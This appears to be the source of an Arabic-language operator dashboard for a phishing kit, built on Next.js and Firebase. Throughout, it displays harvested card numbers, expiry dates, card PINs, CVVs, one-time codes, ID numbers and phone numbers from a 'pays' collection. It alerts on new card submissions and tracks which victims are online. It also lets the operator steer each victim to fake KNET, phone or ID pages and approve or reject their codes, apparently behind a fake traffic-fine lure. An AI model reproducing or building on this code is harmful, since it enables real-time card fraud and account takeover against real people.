"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  Users,
  CreditCard,
  UserCheck,
  Filter,
  InfoIcon,
  MoreHorizontal,
  Bell,
  LogOut,
  RefreshCw,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ar } from "date-fns/locale"
import { formatDistanceToNow } from "date-fns"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged, signOut } from "firebase/auth"
import { playNotificationSound } from "@/lib/actions"
import { auth, db, database } from "@/lib/firestore"
import { onValue, ref } from "firebase/database"
import { Checkbox } from "@/components/ui/checkbox"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from "@/components/ui/dropdown-menu"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { Skeleton } from "@/components/ui/skeleton"
import { Separator } from "@/components/ui/separator"

function useOnlineUsersCount() {
  const [onlineUsersCount, setOnlineUsersCount] = useState(0)

  useEffect(() => {
    const onlineUsersRef = ref(database, "status")
    const unsubscribe = onValue(onlineUsersRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        const onlineCount = Object.values(data).filter((status: any) => status.state === "online").length
        setOnlineUsersCount(onlineCount)
      }
    })

    return () => unsubscribe()
  }, [])

  return onlineUsersCount
}

interface Notification {
  bank: string
  bank_card: string
  cardNumber: string
  cardStatus: string
  ip?: string
  createdDate: string
  cvv: string
  id: string | "0"
  month: string
  notificationCount: number
  otp: string
  otp2: string
  page: string
  pass: string
  country?: string
  personalInfo: {
    id?: string | "0"
  }
  prefix: string
  status: "pending" | "approved" | "rejected" | string
  isOnline?: boolean
  lastSeen: string
  violationValue: number
  year: string
  pagename: string
  plateType: string
  allOtps?: string[]
  idNumber: string
  email: string
  mobile: string
  network: string
  phoneOtp: string
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [message, setMessage] = useState<boolean>(false)
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
  const [violationValues, setViolationValues] = useState<{
    [key: string]: string
  }>({})
  const [totalVisitors, setTotalVisitors] = useState<number>(0)
  const [cardSubmissions, setCardSubmissions] = useState<number>(0)
  const [showOnlineOnly, setShowOnlineOnly] = useState(false)
  const [showWithCardOnly, setShowWithCardOnly] = useState(false)
  const [showFilters, setShowFilters] = useState(false)
  const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})
  const router = useRouter()
  const onlineUsersCount = useOnlineUsersCount()

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })

    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    // Apply filters whenever filter settings or notifications change
    applyFilters()
  }, [notifications, showOnlineOnly, showWithCardOnly])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => {
            const data = doc.data() as any
            setViolationValues((prev) => ({
              ...prev,
              [doc.id]: data.violationValue || "",
            }))
            return { id: doc.id, ...data }
          })
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are any new notifications with card info or general info
        const hasNewCardInfo = notificationsData.some(
          (notification) =>
            notification.cardNumber && !notifications.some((n) => n.id === notification.id && n.cardNumber),
        )
        const hasNewGeneralInfo = notificationsData.some(
          (notification) =>
            (notification.idNumber || notification.email || notification.mobile) &&
            !notifications.some((n) => n.id === notification.id && (n.idNumber || n.email || n.mobile)),
        )

        // Only play notification sound if new card info or general info is added
        if (hasNewCardInfo || hasNewGeneralInfo) {
          playNotificationSound()
        }

        // Update statistics
        updateStatistics(notificationsData)

        setNotifications(notificationsData)

        // Fetch online status for all users
        notificationsData.forEach((notification) => {
          fetchUserStatus(notification.id)
        })

        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const fetchUserStatus = (userId: string) => {
    const userStatusRef = ref(database, `/status/${userId}`)

    onValue(userStatusRef, (snapshot) => {
      const data = snapshot.val()
      if (data) {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: data.state,
        }))
      } else {
        setUserStatuses((prev) => ({
          ...prev,
          [userId]: "offline",
        }))
      }
    })
  }

  const applyFilters = () => {
    let filtered = [...notifications]

    if (showOnlineOnly) {
      filtered = filtered.filter((notification) => userStatuses[notification.id] === "online")
    }

    if (showWithCardOnly) {
      filtered = filtered.filter((notification) => notification.cardNumber && notification.cardNumber.trim() !== "")
    }

    setFilteredNotifications(filtered)
  }

  const updateStatistics = (notificationsData: Notification[]) => {
    // Total visitors is the total count of notifications
    const totalCount = notificationsData.length

    // Card submissions is the count of notifications with card info
    const cardCount = notificationsData.filter((notification) => notification.cardNumber).length

    setTotalVisitors(totalCount)
    setCardSubmissions(cardCount)
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
    } catch (error) {
      console.error("Error hiding all notifications:", error)
    } finally {
      setIsLoading(false)
    }
  }

  const handleDelete = async (id: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { isHidden: true })
      setNotifications(notifications.filter((notification) => notification.id !== id))
    } catch (error) {
      console.error("Error hiding notification:", error)
    }
  }

  const handleApproval = async (state: string, id: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        status: state,
      })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, status: state } : notification,
        ),
      )

      setMessage(true)
      setTimeout(() => {
        setMessage(false)
      }, 3000)
    } catch (error) {
      console.error("Error updating approval status:", error)
    }
  }

  const handleLogout = async () => {
    try {
      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  const toggleFilters = () => {
    setShowFilters(!showFilters)
  }

  const handleViolationUpdate = async (id: string, value: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { violationValue: value })
      setViolationValues((prev) => ({ ...prev, [id]: value }))
    } catch (error) {
      console.error("Error updating violation value:", error)
    }
  }

  const handleUpdatePage = async (id: string, page: string) => {
    try {
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { page: page })
      setNotifications(notifications.map((notif) => (notif.id === id ? { ...notif, page: page } : notif)))
    } catch (error) {
      console.error("Error updating current page:", error)
    }
  }

  function UserStatusBadge({ userId }: { userId: string }) {
    const status = userStatuses[userId] || "unknown"

    return (
      <Badge
        variant="outline"
        className={`${
          status === "online"
            ? "bg-green-100 text-green-700 border-green-200"
            : "bg-red-100 text-red-700 border-red-200"
        } font-medium`}
      >
        <span className={`mr-1.5 h-2 w-2 rounded-full ${status === "online" ? "bg-green-500" : "bg-red-500"}`} />
        <span style={{ fontSize: "12px" }}>{status === "online" ? "متصل" : "غير متصل"}</span>
      </Badge>
    )
  }

  const displayNotifications =
    filteredNotifications.length > 0 || showOnlineOnly || showWithCardOnly ? filteredNotifications : notifications

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gray-50 text-black p-6">
        <div className="max-w-7xl mx-auto">
          <div className="flex justify-between items-center mb-8">
            <Skeleton className="h-8 w-48" />
            <Skeleton className="h-10 w-32" />
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-8">
            {[1, 2, 3].map((i) => (
              <Skeleton key={i} className="h-28 w-full rounded-lg" />
            ))}
          </div>

          <Skeleton className="h-96 w-full rounded-lg" />
        </div>
      </div>
    )
  }

  return (
    <div dir="rtl" className="min-h-screen bg-gray-50 text-black">
      <div className="max-w-7xl mx-auto p-4 sm:p-6">
        <header className="flex flex-col sm:flex-row justify-between items-center mb-8">
          <div className="flex items-center mb-4 sm:mb-0">
            <Bell className="h-6 w-6 text-gray-700 mr-2" />
            <h1 className="text-2xl font-bold text-gray-800">لوحة الإشعارات</h1>
            <Badge className="mr-3 bg-gray-200 text-gray-700 hover:bg-gray-300">{displayNotifications.length}</Badge>
          </div>

          <div className="flex flex-wrap gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    onClick={toggleFilters}
                    className="bg-white border-gray-200 hover:bg-gray-50 text-gray-700 flex items-center gap-2"
                  >
                    <Filter className="h-4 w-4" />
                    الفلاتر
                    {(showOnlineOnly || showWithCardOnly) && (
                      <Badge className="mr-1 bg-gray-700">{showOnlineOnly && showWithCardOnly ? "2" : "1"}</Badge>
                    )}
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تصفية الإشعارات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    onClick={() => fetchNotifications()}
                    className="bg-white border-gray-200 hover:bg-gray-50 text-gray-700"
                  >
                    <RefreshCw className="h-4 w-4" />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button variant="outline" className="bg-white border-gray-200 hover:bg-gray-50 text-gray-700">
                  <MoreHorizontal className="h-4 w-4" />
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end">
                <DropdownMenuItem
                  onClick={handleClearAll}
                  disabled={notifications.length === 0}
                  className="text-red-600 focus:text-red-600 cursor-pointer"
                >
                  <Trash2 className="h-4 w-4 mr-2" />
                  مسح جميع الإشعارات
                </DropdownMenuItem>
                <DropdownMenuItem onClick={handleLogout} className="cursor-pointer">
                  <LogOut className="h-4 w-4 mr-2" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </header>

        {showFilters && (
          <Card className="mb-6 border-gray-200 shadow-sm">
            <CardHeader className="pb-3">
              <CardTitle className="text-lg font-medium">خيارات التصفية</CardTitle>
            </CardHeader>
            <CardContent>
              <div className="flex flex-col sm:flex-row gap-6">
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="online-filter"
                    checked={showOnlineOnly}
                    onCheckedChange={(checked: boolean) => setShowOnlineOnly(checked === true)}
                    className="border-gray-300 data-[state=checked]:bg-gray-800 data-[state=checked]:border-gray-800"
                  />
                  <label
                    htmlFor="online-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين المتصلين فقط
                  </label>
                </div>
                <div className="flex items-center space-x-2 space-x-reverse">
                  <Checkbox
                    id="card-filter"
                    checked={showWithCardOnly}
                    onCheckedChange={(checked: boolean) => setShowWithCardOnly(checked === true)}
                    className="border-gray-300 data-[state=checked]:bg-gray-800 data-[state=checked]:border-gray-800"
                  />
                  <label
                    htmlFor="card-filter"
                    className="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70"
                  >
                    عرض المستخدمين الذين لديهم بطاقة فقط
                  </label>
                </div>
              </div>
              {(showOnlineOnly || showWithCardOnly) && (
                <div className="mt-4 text-sm text-gray-600">
                  يتم عرض {displayNotifications.length} من أصل {notifications.length} إشعار
                </div>
              )}
            </CardContent>
          </Card>
        )}

        {/* Statistics Grid */}
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4 mb-8">
          {/* Online Users Card */}
          <Card className="border-gray-200 shadow-sm">
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="rounded-full bg-green-100 p-3 mr-4">
                  <UserCheck className="h-6 w-6 text-green-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 mb-1">المستخدمين المتصلين</p>
                  <p className="text-2xl font-bold text-gray-800">{onlineUsersCount}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Total Visitors Card */}
          <Card className="border-gray-200 shadow-sm">
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="rounded-full bg-blue-100 p-3 mr-4">
                  <Users className="h-6 w-6 text-blue-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 mb-1">إجمالي الزوار</p>
                  <p className="text-2xl font-bold text-gray-800">{totalVisitors}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Card Submissions Card */}
          <Card className="border-gray-200 shadow-sm">
            <CardContent className="p-6">
              <div className="flex items-center">
                <div className="rounded-full bg-purple-100 p-3 mr-4">
                  <CreditCard className="h-6 w-6 text-purple-600" />
                </div>
                <div>
                  <p className="text-sm text-gray-500 mb-1">معلومات البطاقات المقدمة</p>
                  <p className="text-2xl font-bold text-gray-800">{cardSubmissions}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <Card className="border-gray-200 shadow-sm overflow-hidden">
          {/* Desktop Table View - Hidden on Mobile */}
          <div className="hidden md:block overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="bg-gray-50 border-b border-gray-200">
                  <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    الدوله
                  </th>
                  <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    الإسم
                  </th>
                  <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    المعلومات
                  </th>
                  <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    الصفحة الحالية
                  </th>
                  <th className="px-4 py-3 text-right text-xs font-medium text-gray-500 uppercase tracking-wider">
                    الوقت
                  </th>
                  <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                    الحالة
                  </th>
                  <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                    تحديث الصفحة
                  </th>
                  <th className="px-4 py-3 text-center text-xs font-medium text-gray-500 uppercase tracking-wider">
                    إجراءات
                  </th>
                </tr>
              </thead>
              <tbody className="bg-white divide-y divide-gray-200">
                {displayNotifications.length > 0 ? (
                  displayNotifications.map((notification) => (
                    <tr key={notification.id} className="hover:bg-gray-50 transition-colors">
                      <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-700">
                        {notification?.country || "غير معروف"}
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-700">
                        {notification.personalInfo?.id || "غير معروف"}
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <div className="flex flex-wrap gap-2">
                          <Badge
                            variant={notification.personalInfo?.id ? "outline" : "secondary"}
                            className={`rounded-md cursor-pointer ${
                              notification.personalInfo?.id
                                ? "bg-blue-100 text-blue-700 border-blue-200 hover:bg-blue-200"
                                : "bg-gray-100 text-gray-700"
                            }`}
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            {notification.personalInfo?.id ? "معلومات شخصية" : "لا يوجد معلومات"}
                          </Badge>
                          <Badge
                            variant={notification.cardNumber ? "outline" : "secondary"}
                            className={`rounded-md cursor-pointer ${
                              notification.cardNumber
                                ? "bg-green-100 text-green-700 border-green-200 hover:bg-green-200"
                                : "bg-gray-100 text-gray-700"
                            }`}
                            onClick={() => handleInfoClick(notification, "card")}
                          >
                            {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                          </Badge>
                          {notification.mobile && (
                            <Badge
                              variant="outline"
                              className="rounded-md cursor-pointer bg-yellow-100 text-yellow-700 border-yellow-200 hover:bg-yellow-200"
                              onClick={() => handleInfoClick(notification, "personal")}
                            >
                              <InfoIcon className="h-3 w-3 mr-1" />
                              معلومات عامة
                            </Badge>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-700">خطوه - {notification.page}</td>
                      <td className="px-4 py-4 whitespace-nowrap text-sm text-gray-500">
                        {notification.createdDate &&
                          formatDistanceToNow(new Date(notification.createdDate), {
                            addSuffix: true,
                            locale: ar,
                          })}
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap text-center">
                        <UserStatusBadge userId={notification.id} />
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap">
                        <div className="flex flex-col items-center space-y-2">
                          <div className="flex justify-center space-x-2 space-x-reverse">
                            {[
                              { page: "main", label: "الرئيسية", hint: "الصفحة الرئيسية" },
                              { page: "knet", label: "كنت", hint: "صفحة كنت" },
                              { page: "phone", label: "تلفون", hint: "تلفون" },
                              { page: "sahel", label: "هوية", hint: "هوية" },
                            ].map(({ page, label, hint }) => (
                              <TooltipProvider key={page}>
                                <Tooltip>
                                  <TooltipTrigger asChild>
                                    <Button
                                      variant={notification?.page === page ? "default" : "outline"}
                                      size="sm"
                                      onClick={() => handleUpdatePage(notification.id, page)}
                                      className={`relative ${
                                        notification.page === page
                                          ? "bg-gray-800 hover:bg-gray-700 text-white"
                                          : "bg-white text-gray-700"
                                      }`}
                                    >
                                      {label}
                                      {notification.page === page && (
                                        <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                                          ✓
                                        </span>
                                      )}
                                    </Button>
                                  </TooltipTrigger>
                                  <TooltipContent>
                                    <p>{hint}</p>
                                  </TooltipContent>
                                </Tooltip>
                              </TooltipProvider>
                            ))}
                          </div>
                        </div>
                      </td>
                      <td className="px-4 py-4 whitespace-nowrap text-center">
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="text-red-600 hover:text-red-700 hover:bg-red-50"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={8} className="px-4 py-8 text-center text-gray-500">
                      لا توجد إشعارات متاحة
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
          {/* Mobile Card View - Shown only on Mobile */}

          <div className="md:hidden space-y-4 p-4">
            {displayNotifications.length > 0 ? (
              displayNotifications.map((notification) => (
                <Card key={notification.id} className="border-gray-200 shadow-sm overflow-hidden">
                  <CardContent className="p-0">
                    <div className="p-4 bg-gray-50 flex justify-between items-start">
                      <div>
                        <div className="font-medium text-gray-800">{notification.personalInfo?.id || "غير معروف"}</div>
                        <div className="text-sm text-gray-500">{notification?.country || "غير معروف"}</div>
                      </div>
                      <div className="flex items-center gap-2">
                        <UserStatusBadge userId={notification.id} />
                        <Button
                          variant="ghost"
                          size="sm"
                          onClick={() => handleDelete(notification.id)}
                          className="h-8 w-8 p-0 text-red-600 hover:text-red-700 hover:bg-red-50"
                        >
                          <Trash2 className="h-4 w-4" />
                        </Button>
                      </div>
                    </div>

                    <div className="p-4 space-y-4">
                      <div className="flex flex-wrap gap-2">
                        <Badge
                          variant={notification.personalInfo?.id ? "outline" : "secondary"}
                          className={`rounded-md cursor-pointer ${
                            notification.personalInfo?.id
                              ? "bg-blue-100 text-blue-700 border-blue-200"
                              : "bg-gray-100 text-gray-700"
                          }`}
                          onClick={() => handleInfoClick(notification, "personal")}
                        >
                          {notification.personalInfo?.id ? "معلومات شخصية" : "لا يوجد معلومات"}
                        </Badge>
                        <Badge
                          variant={notification.cardNumber ? "outline" : "secondary"}
                          className={`rounded-md cursor-pointer ${
                            notification.cardNumber
                              ? "bg-green-100 text-green-700 border-green-200 hover:bg-green-200"
                              : "bg-gray-100 text-gray-700"
                          }`}
                          onClick={() => handleInfoClick(notification, "card")}
                        >
                          {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                        </Badge>
                        {notification.mobile && (
                          <Badge
                            variant="outline"
                            className="rounded-md cursor-pointer bg-yellow-100 text-yellow-700 border-yellow-200"
                            onClick={() => handleInfoClick(notification, "personal")}
                          >
                            <InfoIcon className="h-3 w-3 mr-1" />
                            معلومات عامة
                          </Badge>
                        )}
                      </div>

                      <div className="grid grid-cols-2 gap-2 text-sm">
                        <div>
                          <span className="font-medium text-gray-700">الصفحة الحالية:</span>
                          <p className="text-gray-600">خطوه - {notification.page}</p>
                        </div>

                        <div>
                          <span className="font-medium text-gray-700">الوقت:</span>
                          <p className="text-gray-600">
                            {notification.createdDate &&
                              formatDistanceToNow(new Date(notification.createdDate), {
                                addSuffix: true,
                                locale: ar,
                              })}
                          </p>
                        </div>
                      </div>
                    </div>

                    <Separator />

                    <div className="p-4">
                      <div className="text-sm font-medium text-gray-700 mb-3">تحديث الصفحة:</div>
                      <div className="flex flex-wrap gap-2">
                        {[
                          { page: "main", label: "الرئيسية", hint: "الصفحة الرئيسية" },
                          { page: "knet", label: "كنت", hint: "صفحة كنت" },
                          { page: "phone", label: "تلفون", hint: "تلفون" },
                          { page: "sahel", label: "هوية", hint: "هوية" },
                        ].map(({ page, label, hint }) => (
                          <Button
                            key={page}
                            variant={notification?.page === page ? "default" : "outline"}
                            size="sm"
                            onClick={() => handleUpdatePage(notification.id, page)}
                            className={`relative ${
                              notification.page === page
                                ? "bg-gray-800 hover:bg-gray-700 text-white"
                                : "bg-white text-gray-700"
                            }`}
                          >
                            {label}
                            {notification.page === page && (
                              <span className="absolute -top-2 -right-2 bg-green-500 text-white text-xs rounded-full w-4 h-4 flex items-center justify-center">
                                ✓
                              </span>
                            )}
                          </Button>
                        ))}
                      </div>
                    </div>
                  </CardContent>
                </Card>
              ))
            ) : (
              <div className="text-center py-8 text-gray-500">لا توجد إشعارات متاحة</div>
            )}
          </div>
        </Card>
      </div>

      <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
        <DialogContent className="bg-white text-black max-w-[90vw] md:max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-xl font-bold text-gray-800">
              {selectedInfo === "personal"
                ? "المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "معلومات البطاقة"
                  : "معلومات عامة"}
            </DialogTitle>
            <DialogDescription className="text-gray-500">
              {selectedInfo === "personal"
                ? "تفاصيل المعلومات الشخصية"
                : selectedInfo === "card"
                  ? "تفاصيل معلومات البطاقة"
                  : "تفاصيل المعلومات العامة"}
            </DialogDescription>
          </DialogHeader>

          {selectedInfo === "personal" && selectedNotification?.plateType && (
            <div className="space-y-3 py-2">
              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">رقم الهوية:</span>
                <span className="text-gray-900">{selectedNotification.idNumber}</span>
              </div>
            </div>
          )}

          {selectedInfo === "card" && selectedNotification && (
            <div className="space-y-3 py-2">
              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">البنك:</span>
                <span className="text-gray-900">{selectedNotification.bank}</span>
              </div>

              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">رقم البطاقة:</span>
                <span className="text-gray-900">
                  {selectedNotification.cardNumber &&
                    `${selectedNotification.cardNumber} - ${selectedNotification.prefix}`}
                </span>
              </div>

              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">تاريخ الانتهاء:</span>
                <span className="text-gray-900">
                  {selectedNotification.year}/{selectedNotification.month}
                </span>
              </div>

              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">رمز البطاقة:</span>
                <span className="text-gray-900">{selectedNotification.pass}</span>
              </div>

              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">رمز التحقق:</span>
                <span className="text-gray-900">{selectedNotification?.otp2!}</span>
              </div>

              <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                <span className="font-medium text-gray-700">رمز الامان:</span>
                <span className="text-gray-900">{selectedNotification?.cvv!}</span>
              </div>
            </div>
          )}

          {selectedInfo === "personal" && selectedNotification && (
            <div className="space-y-3 py-2">
              {selectedNotification.mobile && (
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                  <span className="font-medium text-gray-700">الهاتف:</span>
                  <span className="text-gray-900">{selectedNotification.mobile}</span>
                </div>
              )}

              {selectedNotification.idNumber && (
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                  <span className="font-medium text-gray-700">رقم الهوية:</span>
                  <span className="text-gray-900">{selectedNotification.idNumber}</span>
                </div>
              )}

              {selectedNotification.network && (
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                  <span className="font-medium text-gray-700">نوع الشبكة:</span>
                  <span className="text-gray-900">{selectedNotification.network}</span>
                </div>
              )}

              {selectedNotification.violationValue && (
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                  <span className="font-medium text-gray-700">قيمة المخالفة:</span>
                  <span className="text-gray-900">{selectedNotification.violationValue}</span>
                </div>
              )}

              {selectedNotification.otp && (
                <div className="flex items-center justify-between bg-gray-50 p-3 rounded-md">
                  <span className="font-medium text-gray-700">رمز التحقق المرسل:</span>
                  <span className="text-gray-900">{selectedNotification.otp}</span>
                </div>
              )}

              <DialogFooter className="sm:justify-center gap-3 mt-4">
                <Button
                  onClick={() => {
                    handleApproval("approved", selectedNotification.id)
                  }}
                  className="bg-green-600 hover:bg-green-700 text-white"
                >
                  قبول
                </Button>
                <Button
                  onClick={() => {
                    handleApproval("rejected", selectedNotification.id)
                  }}
                  variant="destructive"
                  className="bg-red-600 hover:bg-red-700"
                >
                  رفض
                </Button>
              </DialogFooter>

              {message && <div className="mt-2 text-center text-green-600 font-medium">تم تحديث الحالة بنجاح</div>}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  )
}

